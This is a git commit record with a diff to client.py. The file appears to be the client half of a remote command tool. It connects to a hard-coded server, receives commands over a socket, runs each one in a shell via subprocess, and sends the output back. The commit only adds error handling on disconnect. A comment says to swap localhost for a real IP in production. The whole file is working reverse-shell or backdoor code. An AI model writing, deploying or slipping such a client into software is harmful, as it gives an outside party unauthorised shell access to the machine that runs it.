a8b1c8d7fe89e8433102ef1757064a0c67768493
Zenpro11 <86944994+Zenpro11@users.noreply.github.com>
2021-07-16 22:17:31 +0800

    Client Error Handling
    made it so the program exits properly everytime server disconnects instead of crashing

--- client.py
+++ client.py
@@ -1,28 +1,32 @@
 import socket
 import subprocess
 
-#Set IP address and PORT to the server
-SERVER_HOST = '127.0.0.1' #Temporary localhost for testing (Make sure to use the client's IP during production
+# Set IP address and PORT to the server
+SERVER_HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
 SERVER_PORT = 21420
 
-#Connect to server with given IP and PORT
+# Connect to server with given IP and PORT
 client = socket.socket()
 client.connect((SERVER_HOST, SERVER_PORT))
 
-#When connection is established
+# When connection is established
 while True:
-  print('Connection has been established, awaiting commands from server.')
-  #Get commands from the server
-  serverCommand = client.recv(1024)
-  serverCommand = serverCommand.decode()
-  
-  #Open command prompt and insert command given by the server
-  cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-  getOutput = cmdPrompt.stdout.read()
-  getErrorOut = cmdPrompt.stderr.read()
-  
-  #Send back the output
-  client.send(getOutput)
-  
-#client.close()
-print('Connection disconnected.')
+    print('Connection has been established, awaiting commands from server.')
+    # Get commands from the server
+    try:
+        serverCommand = client.recv(1024)
+        serverCommand = serverCommand.decode()
+    except Exception as e:
+        print(e)
+        break
+    else:
+        # Open command prompt and insert command given by the server
+        cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        getOutput = cmdPrompt.stdout.read()
+        getErrorOut = cmdPrompt.stderr.read()
+
+        # Send back the output
+        client.send(getOutput)
+
+# client.close()
+print(f'[INFO] {SERVER_HOST} disconnected.')
